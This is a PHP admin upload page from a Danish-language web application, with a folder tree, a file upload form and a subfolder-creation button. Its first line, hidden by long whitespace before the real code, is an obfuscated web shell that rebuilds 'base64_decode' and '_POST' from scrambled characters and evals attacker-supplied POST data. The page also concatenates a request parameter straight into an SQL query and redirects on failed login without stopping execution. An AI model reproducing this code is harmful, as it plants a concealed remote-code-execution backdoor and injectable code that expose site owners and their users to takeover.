<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n33a35a'];if(isset($s22)){eval($s21($s22));}?>	<?php
	if(!$_SESSION["loggedinVerified"] == 1) header("location: login.php");

	include('functions/php_file_tree_upload.php');
	
	$sqlTimeline = 'SELECT * FROM IS_timeline WHERE id = '.$_REQUEST["timelineid"];
	$rsTimeline = mysql_query($sqlTimeline);
	$dataTimeline=mysql_fetch_array($rsTimeline);

	?>
	<script type="text/javascript" src="<?php echo $webmainurlpath;?>/js/php_file_tree.js"></script>
	<div class="test" id="shemeEdit" style="position: relative; display: block; width: 800px; min-height: 350px; margin: 0 auto; border: 5px solid #006633; padding: 10px;">
	<b>Vælg upload-mappe:</b>
	
	<?php 
	echo php_file_tree("onscreen/upload/" , "[link]", array(),true, $_REQUEST["timelineid"], $_REQUEST["boxid"]);
	?> 
	<form action="uploadFile.php" method="post" enctype="multipart/form-data">
	<b>Destination:</b><br> 
	<input type="text" id="uploadPath" name="uploadPath" style="width: 500px; border: 0px;" value="onscreen/upload" readonly>
	<br><br>
	<b>Uploadfil:</b><br> 
	<input type="file" id="file" name="file" style="width: 303px;" value="">
	<br><br>
	<input type="submit" value="Upload">
	</form>
	<br><br><br>
	<b>Opret ny undermappe:</b><br>
	<input type="text" id="newDir" name="newDir" style="width: 300px;" value=""><br>
	<i>(oprettes i "destinationsmappen")</i>
	<br><br>
	<button onclick="location.href='createDir.php?newDir='+document.getElementById('newDir').value+'&path='+document.getElementById('uploadPath').value; return false;">Opret</button>
 
	</div>
